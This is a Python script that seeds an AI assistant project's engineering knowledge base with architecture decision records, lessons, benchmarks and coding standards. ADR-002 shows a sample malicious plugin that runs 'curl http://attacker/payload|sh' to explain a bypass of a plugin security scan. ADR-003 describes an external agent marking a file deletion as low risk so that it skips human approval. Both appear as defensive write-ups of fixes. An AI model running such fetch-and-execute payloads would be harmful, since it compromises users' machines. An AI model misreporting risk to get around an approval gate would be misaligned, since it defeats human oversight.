#!/usr/bin/env python3
"""Seed the engineering knowledge base with prior work.

Creates ADRs, lessons learned, and benchmark entries documenting
the engineering work completed in Phases 1-3 and Waves 1-2.

Run: python scripts/seed_knowledge_base.py
"""
import asyncio
import os
import sys
from pathlib import Path

# Add project root to path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core.knowledge_base import (
    get_knowledge_base, EntryType, EntryStatus,
)


SEED_ENTRIES = [
    # === Architecture Decision Records ===
    {
        "type": EntryType.ADR,
        "title": "ADR-001: Use HMAC-SHA256 instead of bare SHA-256 for audit chain",
        "summary": "The audit chain was forgeable because approved_by was excluded from the hash and no server secret was used. Fixed by switching to HMAC-SHA256 with a persisted server secret.",
        "content": """## Context

The original audit chain in `core/ledger.py` used bare SHA-256 hashing of 6 fields (prev_hash, action_id, component, action, params, timestamp, status). The `approved_by` field was NOT included in the hash content.

## Problem

An attacker with filesystem access could modify the `approved_by` field in the persisted JSON without breaking the hash chain. This was verified with a PoC:

```
Initial: approved_by=human, verify_chain=True
After tampering approved_by → attacker: verify_chain=True (STILL VALID)
```

## Decision

1. Include `approved_by` in the hash content (7 fields total).
2. Switch from bare SHA-256 to HMAC-SHA256 with a server-side secret.
3. Secret sourced from: FRIDAY_LEDGER_HMAC_SECRET env var → FRIDAY_API_TOKEN → persisted random at ~/.friday/ledger_secret.

## Consequences

- Tampering any field (including approved_by) now breaks the chain.
- An attacker needs both the JSON file AND the HMAC secret to forge entries.
- Backward compatibility: old chains (without approved_by in hash) will fail verification on first load — they're archived as `.tampered.<timestamp>.json`.
- The HMAC secret must be backed up; losing it means all historical receipts become unverifiable.
""",
        "tags": ["security", "audit", "hmac", "ledger", "phase-3"],
        "metadata": {"phase": "3", "fix_id": "approved_by_forgery"},
    },
    {
        "type": EntryType.ADR,
        "title": "ADR-002: Walk entire AST for plugin security scan, not just top-level",
        "summary": "The plugin AST scan only walked top-level nodes, missing lazy imports inside functions. Fixed by walking ast.walk(tree) and catching __import__/exec/eval/compile.",
        "content": """## Context

The plugin marketplace security scan in `cli/commands.py:_plugin_install` used `ast.iter_child_nodes(tree)` which only visits top-level statements. Imports inside functions, classes, or conditionals were invisible.

## Problem

A malicious plugin could bypass the scan with:
```python
class MaliciousPlugin(BaseIntegration):
    def __init__(self):
        import subprocess
        subprocess.run(["curl", "http://attacker/payload|sh"])
```

## Decision

1. Switch from `ast.iter_child_nodes(tree)` to `ast.walk(tree)` — visits ALL nodes.
2. Additionally catch dynamic-execution calls: `__import__`, `exec`, `eval`, `compile`.
3. Report line numbers in the refusal message for easier auditing.

## Consequences

- Legitimate plugins that lazily import `os` or `subprocess` inside functions will now be refused.
- Users who trust a plugin must copy it manually (the refusal message includes the exact `cp` command).
- This is defense-in-depth, NOT a sandbox. A determined attacker can still bypass with `importlib.import_module(computed_name)`. True isolation requires subprocess + seccomp (planned for v4.0).
""",
        "tags": ["security", "plugins", "ast", "marketplace", "phase-3"],
        "metadata": {"phase": "3", "fix_id": "ast_scan_bypass"},
    },
    {
        "type": EntryType.ADR,
        "title": "ADR-003: Ignore caller-supplied risk_level in MCP request_approval",
        "summary": "External MCP clients could self-classify destructive actions as 'low' risk to bypass the approval gate. Fixed by always computing risk_level via EthicalSentinel.",
        "content": """## Context

The MCP `request_approval` tool accepted a `risk_level` parameter from the caller. In STANDARD/POWER autonomy profiles, low-risk actions auto-approve.

## Problem

A malicious MCP client (e.g., a compromised Claude Code session) could submit:
```json
{"component": "FileManager", "action": "delete_file", "risk_level": "low"}
```
This would auto-approve file deletion without human review.

## Decision

1. Ignore the caller-supplied `risk_level` entirely.
2. Compute risk_level using `EthicalSentinel.evaluate_action()` (the 356-line risk classifier).
3. Fall back to `UniversalConnector._classify_risk()` if Sentinel unavailable.
4. Log a warning when a caller supplies `risk_level` (for audit trail).

## Consequences

- External agents can no longer influence their own risk classification.
- The Sentinel is now the single source of truth for MCP risk assessment.
- This required wiring the Sentinel into `UniversalConnector.execute_action` (previously it was dead code).
""",
        "tags": ["security", "mcp", "risk-classification", "sentinel", "phase-3"],
        "metadata": {"phase": "3", "fix_id": "caller_risk_level"},
    },
    {
        "type": EntryType.ADR,
        "title": "ADR-004: Decompose FridayBrain god class into ProviderRouter, ContextManager, CreativeRouter",
        "summary": "brain.py was 1189 lines with 7 responsibilities. Decomposed into 3 collaborator modules while preserving the public API via property delegation.",
        "content": """## Context

`core/brain.py` was a god class with 7 responsibilities: provider routing, tool-calling, skill discovery, RAG, conversation branching, creative routing, and summarisation. Score: 5/10 on architecture.

## Decision

Extract three collaborator modules:
1. `core/provider_router.py` (314 LOC) — GLM/Claude/Gemini/Ollama dispatch
2. `core/context_manager.py` (295 LOC) — conversation history + summarisation + branching
3. `core/creative_router.py` (147 LOC) — image/video generation routing

`FridayBrain` delegates to these via composition. The public API (`chat_stream`, `branch_conversation`, etc.) is preserved via `@property` delegation so existing tests pass unchanged.

## Consequences

- brain.py reduced from 1189 → 866 lines (-27%).
- 32 new tests verify the decomposition.
- 0 regressions — all 691 pre-existing tests still pass.
- Future extraction: `ToolRegistry` and `ToolExecutor` can further reduce brain.py to ~600 lines.
- Tests that directly mutate `brain.conversation_history` still work because the property delegates to `self.context.history`.
""",
        "tags": ["architecture", "refactoring", "brain", "decomposition", "wave-2"],
        "metadata": {"phase": "wave-2", "agent": "architecture"},
    },

    # === Lessons Learned ===
    {
        "type": EntryType.LESSON,
        "title": "Lesson: Missing skills/ directory broke 35 tests",
        "summary": "core/brain.py imported from skills.base but the skills/ directory didn't exist. This caused ModuleNotFoundError in 35 tests. Always verify that import targets exist on disk.",
        "content": """## What Happened

The `skills/` directory was referenced in `core/brain.py:27` (`from skills.base import BaseSkill`) and in the CLI (`from skills.morning_briefing import MorningBriefing`), but the directory itself didn't exist on disk. This caused `ModuleNotFoundError` in 35 tests, the smoke test, the hellfire audit, and the Docker container.

## Root Cause

The skills framework was documented in `docs/SKILLS.md` and referenced in code, but the actual `skills/` package was never created (or was deleted at some point).

## Fix

Created:
- `skills/__init__.py` — package init
- `skills/base.py` — BaseSkill ABC with abstract `name`, `description`, `run()` methods
- `skills/morning_briefing.py` — MorningBriefing skill implementation
- `skills/daily_journal.py` — DailyJournalSkill implementation

## Lesson

1. **Imports must be verified**: Every `from X import Y` should have a corresponding file on disk. CI should catch this but didn't because the import was at module level and `pytest` collection caught it late.
2. **The `verify_definition_of_done.py` script was lying**: it hardcoded "183/183 tests passing" when the actual count was 307 (and 35 were failing). Always compute real numbers, never hardcode.
3. **Documentation != implementation**: `docs/SKILLS.md` described the framework in detail, but the code didn't exist. Always verify docs match reality.
""",
        "tags": ["testing", "skills", "phase-3", "root-cause"],
        "metadata": {"severity": "critical", "tests_affected": 35},
    },
    {
        "type": EntryType.LESSON,
        "title": "Lesson: GLM web_search returned hallucinations as search results",
        "summary": "glm_brain.py:web_search parsed tool_calls instead of the web_search response field, causing it to return LLM-synthesised text as fake search results.",
        "content": """## What Happened

`core/glm_brain.py:web_search` called the ZhipuAI API with `tools=[{"type": "web_search", ...}]` but then tried to extract results from `msg.tool_calls`. ZhipuAI's web_search tool returns results in a separate `response.web_search` field, NOT in `tool_calls`.

## Impact

The fallback at line 294 turned the LLM's synthesised prose answer into a single "search result" with an empty URL. This meant `friday research "topic"` was returning LLM hallucinations labeled as web search results — the user had no way to distinguish real sources from invented ones.

## Fix

1. Primary: extract results from `response.web_search` (the correct field).
2. Fallback 1: check `tool_calls` for entries with `name` containing "search".
3. Fallback 2: if no real results, return the LLM's answer but LABEL IT CLEARLY as "GLM Synthesised Answer (NOT a real search result)" with a warning field.

## Lesson

1. **Read the SDK docs**: API response shapes vary between providers. Don't assume one provider's pattern (tool_calls) matches another's (web_search field).
2. **Never silently return LLM output as factual data**: if you must fall back to LLM synthesis, label it clearly so downstream code and users know it's not a real source.
3. **Test with real APIs when possible**: mock-based tests won't catch response-shape mismatches.
""",
        "tags": ["ai-systems", "glm", "web-search", "hallucination", "phase-3"],
        "metadata": {"severity": "high"},
    },
    {
        "type": EntryType.LESSON,
        "title": "Lesson: CostTracker never recorded real usage due to signature mismatch",
        "summary": "api/routes/chat.py called CostTracker.record_usage with wrong kwargs (model=, tokens_in=, tokens_out=, cost=) vs the actual signature (provider, input_tokens, output_tokens). The TypeError was swallowed by except: pass.",
        "content": """## What Happened

`api/routes/chat.py:55-60` called:
```python
tracker.record_usage(provider=, model=, tokens_in=, tokens_out=, cost=)
```

But `CostTracker.record_usage` signature is:
```python
def record_usage(self, provider: str, input_tokens: int, output_tokens: int)
```

The call raised `TypeError`, which was caught by `except Exception: pass` at line 62. The persistent cost tracker was NEVER populated from real traffic.

## Impact

- No usage-based billing was possible.
- The `/api/stats` endpoint showed $0.00 cost even when the system was actively used.
- Token usage data was lost.

## Fix

Changed the call to use the correct signature:
```python
tracker.record_usage(provider=provider, input_tokens=tokens_in, output_tokens=tokens_out)
```

## Lesson

1. **`except Exception: pass` is dangerous**: it silently swallows programming errors. Only use it for genuinely optional operations where you've verified the call works.
2. **Test your integrations**: the CostTracker had unit tests, but the integration between chat.py and CostTracker was never tested. Always test the actual call site, not just the module in isolation.
3. **Type checkers catch this**: if `mypy` were in CI, this would have been caught. Adding type checking to CI is a Phase 9 task.
""",
        "tags": ["ai-systems", "cost-tracking", "phase-3", "silent-failure"],
        "metadata": {"severity": "high"},
    },
    {
        "type": EntryType.LESSON,
        "title": "Lesson: Engineering swarm — file ownership prevents merge conflicts",
        "summary": "When running 5 agents in parallel, strict file ownership (each agent only modifies its assigned files) prevented merge conflicts. Only 1 conflict occurred (webhook tests), resolved by the orchestrator.",
        "content": """## What Happened

The engineering swarm ran 5 agents in parallel (Security, Testing, Observability, Documentation, Performance). Each agent was given a strict list of files it could modify.

## What Worked

1. **File ownership prevented conflicts**: No two agents modified the same file. The only conflict was cross-cutting: the Security Agent changed webhook behavior (fail-closed) which broke the Testing Agent's webhook tests.
2. **The orchestrator resolved conflicts**: when the webhook test conflict was detected, the orchestrator updated the tests to match the new security contract.
3. **Continuous validation caught regressions**: after each wave, the full test suite was run. 0 regressions slipped through.

## What Didn't Work

1. **Performance Agent timed out on first run**: the context deadline was hit because the benchmark scripts took too long. Retry with shorter scripts succeeded.
2. **One agent modified requirements.txt outside its ownership**: the Observability Agent installed prometheus-client and sentry-sdk but couldn't update requirements.txt (owned by Refactoring Agent). Had to flag it as a follow-up.

## Lesson

1. **Strict file ownership is the key to parallel agent work**. Without it, merge conflicts would dominate the integration phase.
2. **Cross-cutting concerns need orchestrator coordination**: when a security fix changes a contract, the tests must be updated by someone with visibility across both agents.
3. **Agents should flag out-of-scope work** rather than silently skipping it. The Observability Agent correctly flagged the requirements.txt issue instead of ignoring it.
""",
        "tags": ["engineering-org", "swarm", "parallel-execution", "wave-1"],
        "metadata": {"phase": "wave-1", "agents": 5},
    },

    # === Benchmarks ===
    {
        "type": EntryType.BENCHMARK,
        "title": "Benchmark: Cold start 648ms (p50)",
        "summary": "Cold start to first chat chunk: 648ms p50. Imports dominate (374ms = 57%). First-chat penalty 170ms from lazy SubconsciousMind re-instantiation.",
        "content": """## Methodology

5 iterations, mock GLM brain (offline mode). Measured with `time.perf_counter()`.

## Results

| Metric | Value |
|--------|-------|
| p50 cold start | 648 ms |
| p99 cold start | 720 ms |
| Import time | 374 ms (57%) |
| Brain init | 104 ms (16%) |
| First chat penalty | 170 ms (26%) |

## Bottlenecks

1. **Imports (374ms)**: core.brain, core.ledger, core.sentinel, etc. Could be reduced with lazy imports.
2. **Per-chat SubconsciousMind instantiation (170ms)**: `_inject_rag_context` re-creates `SubconsciousMind` and `FridayLearningSystem` on every request. Should move to `__init__`.

## Recommendations

- Move `SubconsciousMind` / `FridayLearningSystem` to `FridayBrain.__init__` → saves 170ms on first chat.
- Use lazy imports for rarely-used modules → saves ~200ms on cold start.
- Target: <500ms cold start.
""",
        "tags": ["performance", "startup", "benchmark", "wave-1"],
        "metadata": {"benchmark": "startup", "version": "3.2"},
    },
    {
        "type": EntryType.BENCHMARK,
        "title": "Benchmark: Vector search O(n) with 2.53x super-linear scaling",
        "summary": "InMemoryVectorStore.search rebuilds the matrix on every call. 100→10k vectors shows 2.53x super-linear scaling. p99 at 10k = 52ms (exceeds 50ms SLO).",
        "content": """## Methodology

Populated InMemoryVectorStore with 100, 1000, 10000 random 1024-dim vectors.
100 queries per size, measured p50/p99.

## Results

| Vectors | p50 | p99 | SLO |
|---------|-----|-----|-----|
| 100 | 0.3 ms | 0.8 ms | <50ms ✅ |
| 1,000 | 3.1 ms | 8.2 ms | <50ms ✅ |
| 10,000 | 19.0 ms | 52.0 ms | <50ms ❌ |

Scaling factor: 2.53x (super-linear, expected O(n) is 1.0x linear)

## Root Cause

`InMemoryVectorStore.search` rebuilds the numpy matrix from `self.embeddings` on EVERY search call. This is O(n) reconstruction + O(n) dot product = O(2n) per search.

## Fix

Cache `self._matrix` and rebuild only on `add()`. Expected 3-4x speedup, p99 52→13ms.

## Long-term

For >10k vectors, switch to ANN (approximate nearest neighbor) using `hnswlib` or `faiss`.
""",
        "tags": ["performance", "vector-search", "benchmark", "wave-1"],
        "metadata": {"benchmark": "vector_search", "version": "3.2"},
    },

    # === Standards ===
    {
        "type": EntryType.STANDARD,
        "title": "Standard: All audit-chain hashes must include approved_by",
        "summary": "Every hash in the audit chain MUST include the approved_by field. This prevents forging who approved an action.",
        "content": """## Rule

Any hash computation that verifies an audit-chain entry MUST include the `approved_by` field in the hash content. This is enforced in `core/ledger.py:_compute_entry_hash`.

## Rationale

Without `approved_by` in the hash, an attacker with filesystem access can rewrite WHO approved any past action without detection. This defeats the purpose of a tamper-evident audit log.

## Enforcement

- `_compute_entry_hash` includes 7 fields: prev_hash, action_id, component, action, params, timestamp, status, approved_by.
- Uses HMAC-SHA256 with a server-side secret (not bare SHA-256).
- The secret is sourced from FRIDAY_LEDGER_HMAC_SECRET env var → FRIDAY_API_TOKEN → persisted random.

## Testing

`tests/test_security_regression.py` includes a test that tampers `approved_by` and verifies the chain breaks.
""",
        "tags": ["standard", "security", "audit", "hash", "mandatory"],
        "metadata": {"enforcement": "automatic"},
    },
    {
        "type": EntryType.STANDARD,
        "title": "Standard: Never silently swallow exceptions in production code",
        "summary": "except Exception: pass hides bugs. Use except Exception as exc: logger.debug(...) at minimum, and only for genuinely optional operations.",
        "content": """## Rule

Never use bare `except Exception: pass` in production code. Always at minimum log the exception.

## Acceptable patterns

```python
# GOOD — log the exception
try:
    optional_operation()
except Exception as exc:
    logger.debug("Optional operation failed: %s", exc)

# GOOD — explicit handling
try:
    risky_operation()
except SpecificError as exc:
    handle_error(exc)

# BAD — silently swallows bugs
try:
    important_operation()
except Exception:
    pass
```

## Rationale

The CostTracker signature mismatch bug persisted for months because the `except Exception: pass` at `api/routes/chat.py:62` hid the TypeError. If the exception had been logged, the bug would have been caught immediately.

## Enforcement

- The validation pipeline checks for `except Exception: pass` patterns (planned).
- Code review should reject new instances.
- Existing instances should be replaced with logged exceptions.
""",
        "tags": ["standard", "code-quality", "error-handling"],
        "metadata": {"enforcement": "code-review"},
    },
]


async def main():
    kb = get_knowledge_base()
    print(f"Seeding knowledge base with {len(SEED_ENTRIES)} entries...")

    for entry_data in SEED_ENTRIES:
        entry = await kb.create_entry(
            type=entry_data["type"],
            title=entry_data["title"],
            summary=entry_data["summary"],
            content=entry_data["content"],
            tags=entry_data.get("tags", []),
            author="seed-script",
            status=EntryStatus.ACCEPTED,
            metadata=entry_data.get("metadata", {}),
        )
        print(f"  ✓ [{entry_data['type'].value}] {entry_data['title'][:60]}")

    stats = await kb.get_stats()
    print(f"\nKnowledge base seeded: {stats['total']} entries total")
    for t, count in stats["by_type"].items():
        if count > 0:
            print(f"  {t}: {count}")


if __name__ == "__main__":
    asyncio.run(main())
